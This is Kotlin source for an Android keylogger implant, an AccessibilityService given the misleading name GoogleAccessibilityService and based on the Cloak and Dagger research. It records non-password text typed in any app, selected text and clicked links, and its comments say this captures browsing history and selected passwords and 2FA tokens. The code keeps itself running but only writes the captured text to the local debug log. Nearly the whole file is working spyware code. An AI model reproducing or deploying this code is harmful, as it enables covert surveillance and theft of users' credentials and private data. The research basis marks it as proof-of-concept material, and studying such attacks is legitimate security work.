/*
* Uses an AccessibilityService as a keylogger.
* Based on Cloak and Dagger: From Two Permissions to Complete Control of the UI Feedback Loop by
* Yanick Fratantonio, Chenxiong Qian, Simon P. Chung, Wenke Lee. 
* 
* Although this cannot see passwords from EditText due to Android's restrictions, we can see text
* the user selects, browser history and non-password text they enter.
* */
package com.cooperthecoder.implant

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Service
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class GoogleAccessibilityService() : AccessibilityService() {

    private val TAG: String = javaClass.name

    override fun onInterrupt() {
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return Service.START_STICKY
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || event.isPassword) {
            // Don't bother with events from password fields; they are empty.
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // This event type is fired when text is entered in any EditText that is not a
                // password.
                for (string in event.strings()) {
                    logEvent(event, "Captured from EditText: $string")
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // This event type includes clicked links, as well as selected text.
                // We can record their browsing history as well as steal passwords and 2FA tokens
                // that are selected.
                for (string in event.selected()) {
                    logEvent(event, "Text selected: $string")
                }
                for (uri in event.uris()) {
                    logEvent(event, "URI detected: $uri")
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo()
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        serviceInfo = info
    }

    private fun logEvent(event: AccessibilityEvent, message: String) {
        Log.d(TAG + event.packageName, message)
    }

}


fun AccessibilityEvent.strings(): List<String> {
    return text.map {
        it.toString()
    }
}

fun AccessibilityEvent.selected(): List<String> {
    return strings().minus(uris())
}

fun AccessibilityEvent.uris(): List<String> {
    // Return all URIs in an accessibility event.
    return strings().filter {
        it.contains("://")
    }
}

fun AccessibilityEvent.eventTypeName(): String {
    return AccessibilityEvent.eventTypeToString(eventType)
}